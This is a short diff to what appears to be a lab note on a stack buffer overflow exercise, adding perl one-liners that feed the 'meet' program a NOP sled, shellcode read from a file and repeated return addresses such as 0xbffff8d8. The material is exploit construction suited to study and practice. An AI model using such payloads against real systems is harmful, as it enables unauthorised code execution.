@@ -46,7 +46,17 @@ perl -e 'print "\x48\xf9\xff\xff"x38'
 ```
 ./meet Mr `perl -e 'print "\x90"x203';``cat sc``perl -e 'print "\x48\xf9\xff\xff"x38';`
 ```
+```
+0xbffff8d8
+perl -e 'print "\xd8\xf8\xff\xff"x38'
 
+./meet Mr `perl -e 'print "\x90"x203';``cat sc``perl -e 'print "\xd8\xf8\xff\xbf"x38';`
+
+```
+### v 0.3
+```
+:0xbffffbe8
+```
 
 
 
